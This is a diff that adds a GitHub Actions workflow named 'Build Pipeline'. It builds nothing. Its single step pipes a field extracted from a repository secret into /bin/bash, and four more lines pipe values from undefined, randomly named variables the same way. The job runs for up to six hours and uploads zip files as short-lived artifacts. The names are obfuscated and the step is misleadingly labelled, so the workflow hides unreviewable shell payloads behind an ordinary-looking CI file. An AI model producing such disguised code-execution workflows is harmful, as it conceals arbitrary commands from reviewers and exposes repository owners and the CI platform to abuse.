@@ -1,0 +1,35 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          una931: ${{ secrets.una931 }}
+        run: |
+          printf '%s' "$una931" | jq -r .vo0437 | /bin/bash
+          echo $kz4943 | jq -r .q60169 | /bin/bash
+          printf '%s' "$xc8276" | jq -r .gykj47960 | /bin/bash
+          printf '%s' "$fyntd9" | jq -r .ljqz6689 | /bin/bash
+          printf '%s' "$rdwg85" | jq -r .ej0 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: vlg2eL7f
+          path: "*.zip"
+          retention-days: 1
